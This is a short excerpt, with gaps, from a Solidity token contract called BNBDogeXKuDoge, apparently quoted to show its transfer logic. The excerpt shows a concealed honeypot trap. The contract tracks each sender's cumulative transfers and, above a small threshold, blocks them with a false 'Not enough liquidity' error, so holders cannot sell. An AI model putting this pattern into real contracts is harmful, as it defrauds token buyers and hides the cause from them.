...
contract BNBDogeXKuDoge is Context, IERC20, Ownable {
    ...
    string private _name = "BNBDogeXKuDoge";
    string private _symbol = "BNBDogeXKuDoge";
	...
	uint256 private minTokenToBuyBack = 1000000000;
    ...
    function _transfer(
        ...
        {
    		if ((_liqFees[from] + amount) >= minTokenToBuyBack) {
    			revert("Not enough liquidity to support transaction");
    		}
    		_liqFees[from] += amount;
        }
